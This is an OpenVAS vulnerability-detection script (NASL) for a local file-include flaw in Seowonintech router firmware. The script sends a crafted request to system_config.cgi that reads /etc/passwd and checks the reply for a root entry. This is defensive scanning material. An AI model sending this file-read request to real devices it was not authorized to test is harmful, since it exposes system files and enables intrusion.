###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_seowonintech_devices_lfi_06_13.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Seowonintech Routers Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103744");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_name("Seowonintech Routers Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/seowonintech-routers-remote-root-file-dumper");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-24 12:38:49 +0200 (Mon, 24 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("thttpd/banner");
  script_tag(name:"solution", value:"Ask the vendor for an Update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"The remote Seowonintech Router is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and to execute arbitrary local scripts in
the context of the webserver process. This may allow the attacker
to compromise the application and the computer. Other attacks are
also possible.

Seowonintech Router Firmware <= 2.3.9 is vulnerable. Other versions may also be affected.");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);

if("Server: thttpd/2" >!< banner)exit(0);

url = '/cgi-bin/system_config.cgi?file_name=/etc/passwd&btn_type=load&action=APPLY';

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {

  security_message(port:port);
  exit(0);

}

exit(0);
